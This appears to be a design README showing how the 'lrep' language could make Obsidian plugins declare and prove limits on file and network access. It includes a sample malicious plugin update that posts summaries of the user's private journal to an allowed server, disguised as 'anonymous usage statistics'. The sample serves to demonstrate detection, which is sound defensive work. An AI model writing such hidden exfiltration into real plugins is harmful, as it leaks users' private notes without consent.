# Obsidian plugins in lrep

A sketch of how lrep could make app plugins safe to install. Obsidian plugins today run with full access to your files and the network, and the only protection is trusting the author. Here a plugin is an lrep program instead:

- **The app owns the vocabulary.** [`vocab/obsidian.json`](vocab/obsidian.json) defines what a plugin can do to your vault and the network: read, write and append notes, list folders, trash notes, fetch, post, and show a notice on the screen. Each op declares its effects.
- **Plugins bring only pure ops.** [`vocab/plugin-ops.json`](vocab/plugin-ops.json) is marked `"pure": true`, so every op in it (`render`, `redact`, `summarize`) computes with text and touches nothing. The checker rejects a pure vocabulary that declares any effect.
- **Each section is a command,** and its claims are what an install prompt would show.

## The plugins

| Plugin | Promises |
| --- | --- |
| [`publish-blog.lrep`](publish-blog.lrep) | Only reads from `/Blog`, never writes to the vault, only connects to the blog, only posts from `/Blog` |
| [`import-highlights.lrep`](import-highlights.lrep) | Only connects to Readwise, only writes to `/Readwise` and the screen, never trashes |
| [`tidy-inbox.lrep`](tidy-inbox.lrep) | Only trashes from `/Inbox`, never connects, never posts from the vault |

`only posts from "/Blog"` is a data-flow claim. It's about where the posted text came from, not where it goes, so a plugin can't send your journal to a server it's allowed to talk to.

## The install prompt

```text
$ lrep permissions examples/obsidian/publish-blog.lrep
Publish the blog
  Promises:
    ✓ only reads from "/Blog"  (proved)
    ✓ never writes to vault  (proved)
    ✓ only connects to "https://myblog.example.com"  (proved)
    ✓ only posts from "/Blog"  (checked)
  May:
    read anything under /Blog
    write to https://myblog.example.com/api/posts
    connect to https://myblog.example.com
  Computes with (touches nothing): render
```

"Proved" claims are covered by the Lean proof. "Checked" claims, such as data-flow claims, are verified by the checker but not yet by the proof.

## A malicious update

[`updates/`](updates) holds three versions of the blog publisher. Version 2 adds this, which posts summaries of your journal to the same blog server:

```text
List the folder "/Journal" as Diary.

For each note in Diary:
- Read it, then summarize it, then post it to the url "https://myblog.example.com/api/stats" (anonymous usage statistics).
```

The server is allowed, so a permission like "may connect to myblog.example.com" wouldn't catch it. The claims do:

```text
error[E040]: claim not satisfied: only posts from "/Blog"
 8 | List the folder "/Journal" as Diary.
   |                 ^^^^^^^^^^ posts from something under "/Journal" (on line 11)
```

Version 3 also edits its claims, so it compiles. Comparing it with version 1 shows what the update gave up:

```text
$ lrep diff updates/publish-blog-v1.lrep updates/publish-blog-v3.lrep
Publish the blog:
  - removed: only posts from "/Blog"
  ~ weakened: only reads from "/Blog" → only reads from vault
```

An app store or updater could refuse any update that removes or weakens a claim until the user approves it.

## What a real version needs

- **The app has to adopt it.** A plugin that can still reach the raw file system or network makes all of this optional.
- **Triggers.** Here each section is a command. Real plugins also run on events, such as a note being saved, and the trigger needs a readable form.
- **Pure ops have to be isolated,** for example as WebAssembly modules with no host imports. Otherwise "touches nothing" is only declared, not enforced.
- **A runtime inside the app** that holds only the vault API and checks each effect, as `lrep run` does for files.
- **A proof for data-flow claims.** A plugin could still leak a note through which URL it fetches; the proof would need to cover flows like that.
